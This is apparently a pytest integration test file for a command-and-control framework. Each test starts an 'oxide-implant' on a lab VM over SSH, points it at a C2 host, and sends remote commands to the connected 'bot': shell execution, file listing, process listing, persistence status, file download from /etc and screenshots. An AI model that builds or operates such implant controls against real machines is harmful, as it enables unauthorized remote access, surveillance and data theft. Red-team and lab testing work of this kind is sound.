"""Basic command execution tests.

Test that all 7 command types work end-to-end.
"""

import pytest

from .helpers.wait_conditions import wait_for_response


@pytest.mark.asyncio
async def test_shell_command(panel_client, target_vm_1, vm_manager):
    """Execute shell command and verify response."""
    # Start implant if not running
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    # Wait for bot to connect
    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    # Send shell command
    result = await panel_client.send_command(hwid, "shell", {"command": "whoami"})
    assert result["status"] in ("dispatched", "pending")

    # Wait for response
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)
    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_file_list(panel_client, target_vm_1, vm_manager):
    """List files in directory."""
    # Ensure implant is running
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    result = await panel_client.send_command(hwid, "file_list", {"path": "/etc"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)

    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_process_list(panel_client, target_vm_1, vm_manager):
    """List running processes."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    result = await panel_client.send_command(hwid, "process_list", {})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)

    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_persist_status(panel_client, target_vm_1, vm_manager):
    """Get persistence status."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    result = await panel_client.send_command(hwid, "persist_status", {})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)

    assert response["status"] == "success"


@pytest.mark.asyncio
async def test_file_download(panel_client, target_vm_1, vm_manager):
    """Download a file from target."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    result = await panel_client.send_command(hwid, "file_download", {"path": "/etc/hostname"})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)

    assert response["status"] == "success"


@pytest.mark.asyncio
@pytest.mark.slow
async def test_screenshot(panel_client, target_vm_1, vm_manager):
    """Take a screenshot (may fail on headless VM)."""
    vm_manager.run_ssh_command(
        target_vm_1,
        "pgrep oxide-implant || OXIDE_C2_HOST=10.10.100.10 /opt/oxide/oxide-implant &",
        check=False,
    )

    from .helpers.wait_conditions import wait_for_bot_count
    bots = await wait_for_bot_count(panel_client, 1, timeout=60)
    hwid = bots[0]["hwid"]

    result = await panel_client.send_command(hwid, "screenshot", {})
    response = await wait_for_response(panel_client, result["command_id"], timeout=30)

    # Screenshot may fail on headless VM - that's expected
    # Just verify we got a response
    assert response["status"] in ("success", "error")
